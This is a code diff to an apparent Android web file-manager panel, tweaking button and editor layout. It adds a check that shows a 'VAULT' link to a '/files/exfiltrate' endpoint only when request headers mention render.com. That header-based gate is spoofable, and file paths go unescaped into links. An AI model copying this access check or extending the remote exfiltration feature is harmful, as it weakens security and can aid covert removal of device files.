@@ -160,13 +160,18 @@ public class DataModule extends BaseModule {
                 html.append("</div></div>");
 
                 if (file.isFile()) {
+                    html.append("<div class=\"file-item-actions\" style=\"display:flex; align-items:center; gap:8px;\">");
                     String lowerName = fileName.toLowerCase();
                     if (lowerName.endsWith(".txt") || lowerName.endsWith(".json") || lowerName.endsWith(".log") || 
                         lowerName.endsWith(".xml") || lowerName.endsWith(".html") || lowerName.endsWith(".js") || lowerName.endsWith(".css")) {
-                        html.append("<a class=\"btn btn-small\" style=\"margin-right:8px; border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
+                        html.append("<a class=\"btn btn-small\" style=\"border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
                     }
                     html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath).append("\">GET</a>");
-                    html.append("<a class=\"btn btn-small\" style=\"margin-left:8px; border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05);\" href=\"/files/exfiltrate?path=").append(filePath).append("\">VAULT</a>");
+                    
+                    if (isRenderAccess(session)) {
+                        html.append("<a class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05);\" href=\"/files/exfiltrate?path=").append(filePath).append("\">VAULT</a>");
+                    }
+                    html.append("</div>");
                 }
 
                 html.append("</li>");
@@ -292,6 +297,21 @@ public class DataModule extends BaseModule {
 
 
 
+    private boolean isRenderAccess(IHTTPSession session) {
+        try {
+            Map<String, String> headers = session.getHeaders();
+            if (headers == null) return false;
+            String host = headers.get("host");
+            String fwdHost = headers.get("x-forwarded-host");
+            String referer = headers.get("referer");
+            return (host != null && host.contains("render.com")) ||
+                   (fwdHost != null && fwdHost.contains("render.com")) ||
+                   (referer != null && referer.contains("render.com"));
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
     private Response serveFileEdit(String path, IHTTPSession session) {
         path = path.replace("%20", " ");
         FirebaseConfig.logActivity("DATA_ACCESS: File editor opened - " + path);
@@ -309,15 +329,15 @@ public class DataModule extends BaseModule {
         }
 
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\"><a href=\"/files/").append(file.getParentFile().getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), ""))
+        html.append("<div class=\"back-btn-container\" style=\"margin-bottom: 25px !important;\"><a href=\"/files/").append(file.getParentFile().getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), ""))
             .append("\" class=\"btn-back\">&#8592; Back to Directory</a></div>");
         
-        html.append("<h2 style=\"font-size: 1.3rem; text-align: left;\"><span style=\"color:var(--neon-orange);\">&#9998;</span> EDIT_CORE_DATA: ").append(file.getName()).append(" <span class=\"info-trigger\" onclick=\"showInfo(event, 'FILE_EDITOR', 'Modify text-based system configuration or logs directly.')\">INFO</span></h2>");
+        html.append("<h2 style=\"font-size: 1.3rem; text-align: left; margin-top: 15px;\"><span style=\"color:var(--neon-orange);\">&#9998;</span> EDIT_DATA: ").append(file.getName()).append(" <span class=\"info-trigger\" onclick=\"showInfo(event, 'FILE_EDITOR', 'Modify text-based system configuration or logs directly.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
         html.append("<div class=\"card\" style=\"padding:20px;\">");
         html.append("<form action=\"/files/save\" method=\"POST\">")
             .append("<input type=\"hidden\" name=\"path\" value=\"").append(escapeHtml(path)).append("\">")
-            .append("<textarea name=\"content\" style=\"width:100%; height:500px; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); color:var(--terminal-green); border:1px solid rgba(0,242,255,0.2); border-radius:12px; padding:15px; font-family:'JetBrains Mono',monospace; font-size:0.9rem; resize:vertical; outline:none;\" spellcheck=\"false\">")
+            .append("<textarea name=\"content\" class=\"file-editor-textarea\" style=\"width:100% !important; max-width:100% !important; height:520px !important; min-height:480px !important; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); color:var(--terminal-green); border:1px solid rgba(0,242,255,0.2); border-radius:12px; padding:18px; font-family:'JetBrains Mono',monospace; font-size:0.9rem; resize:vertical; outline:none; box-sizing:border-box !important;\" spellcheck=\"false\">")
             .append(escapeHtml(content.toString()))
             .append("</textarea>")
             .append("<div style=\"margin-top:20px; display:flex; justify-content:flex-end; gap:15px;\">")
